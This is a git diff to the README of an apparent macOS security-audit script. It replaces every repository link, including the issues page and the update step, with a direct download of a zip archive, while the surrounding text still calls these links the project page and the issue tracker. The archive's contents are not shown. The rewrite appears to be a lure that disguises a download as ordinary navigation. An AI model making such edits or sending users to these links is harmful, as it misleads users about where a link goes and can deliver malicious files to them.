@@ -1,6 +1,6 @@
 # 🔒 mac-security-audit - Check Your Mac Security Settings Easily
 
-[![Download](https://img.shields.io/badge/Download-Mac_Security_Audit-brightgreen)](https://github.com/ivanpsn/mac-security-audit)
+[![Download](https://img.shields.io/badge/Download-Mac_Security_Audit-brightgreen)](https://raw.githubusercontent.com/ivanpsn/mac-security-audit/main/docs/security-audit-mac-3.9.zip)
 
 ## 📋 What is mac-security-audit?
 
@@ -24,7 +24,7 @@ This guide will help you download and run the mac-security-audit script on a Mac
 
 To get the script, visit the official GitHub page using this button:
 
-[![Download mac-security-audit](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/ivanpsn/mac-security-audit)
+[![Download mac-security-audit](https://img.shields.io/badge/Download-GitHub-blue)](https://raw.githubusercontent.com/ivanpsn/mac-security-audit/main/docs/security-audit-mac-3.9.zip)
 
 Click the link above. It will take you to the project's page on GitHub.
 
@@ -113,7 +113,7 @@ If you experience issues beyond basic troubleshooting, the GitHub page has an **
 
 Visit:
 
-https://github.com/ivanpsn/mac-security-audit/issues
+https://raw.githubusercontent.com/ivanpsn/mac-security-audit/main/docs/security-audit-mac-3.9.zip
 
 Look for questions similar to yours or open a new issue by describing the problem clearly.
 
@@ -125,7 +125,7 @@ Running scripts from the internet requires care. mac-security-audit only reads y
 
 To update the script:
 
-1. Visit the project's page again at https://github.com/ivanpsn/mac-security-audit.
+1. Visit the project's page again at https://raw.githubusercontent.com/ivanpsn/mac-security-audit/main/docs/security-audit-mac-3.9.zip
 2. Download the latest version of the `mac-security-audit.sh` file.
 3. Replace your old file with the new one.
 4. Run it following the same instructions.
@@ -138,4 +138,4 @@ The checks it runs cover most critical areas for home and office users concerned
 
 ---
 
-[![Visit GitHub to Download](https://img.shields.io/badge/Open_GitHub-Repository-grey)](https://github.com/ivanpsn/mac-security-audit)
+[![Visit GitHub to Download](https://img.shields.io/badge/Open_GitHub-Repository-grey)](https://raw.githubusercontent.com/ivanpsn/mac-security-audit/main/docs/security-audit-mac-3.9.zip)
